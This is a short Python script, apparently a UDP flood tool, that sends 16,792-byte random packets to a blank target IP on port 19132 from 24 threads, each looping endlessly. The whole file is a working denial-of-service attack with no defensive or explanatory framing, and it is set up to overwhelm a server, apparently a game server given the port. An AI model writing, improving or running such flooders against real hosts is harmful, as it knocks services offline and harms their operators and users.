#!/usr/bin/env python3
import random
import socket
import threading

ip = ""
port = 19132
times = 10
threads = 24
def run():
	data = random._urandom(16792)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Sent!!!")
		except:
			print("[!] Error!!!")

for y in range(threads):
	th = threading.Thread(target = run)
	th.start()
